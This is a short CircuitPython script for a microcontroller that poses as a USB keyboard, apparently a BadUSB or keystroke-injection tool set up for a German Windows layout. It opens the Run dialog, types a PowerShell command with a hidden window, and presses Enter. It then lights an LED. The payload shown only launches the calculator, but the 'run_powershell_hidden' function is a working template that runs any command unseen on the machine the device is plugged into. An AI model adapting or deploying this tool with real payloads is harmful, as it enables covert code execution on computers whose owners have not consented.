import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_de import KeyboardLayout
from keycode_win_de import Keycode
import board
import digitalio

# Initialize the keyboard
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

# Initialize the LED
led = digitalio.DigitalInOut(board.LED)
led.direction = digitalio.Direction.OUTPUT

def run_powershell_hidden(command):
    # Press Windows + R
    kbd.press(Keycode.WINDOWS, Keycode.R)
    kbd.release_all()
    time.sleep(0.5)

    # Open PowerShell in hidden mode and insert the command
    ps_command = f'powershell -W H -C "{command}"'
    layout.write(ps_command, delay=0.005)
    time.sleep(0.02)

    # Press Enter
    kbd.press(Keycode.ENTER)
    kbd.release_all()

# Run the payload
run_powershell_hidden("calc")

# Indicate that the payload has finished by turning on the LED
while True:
    led.value = True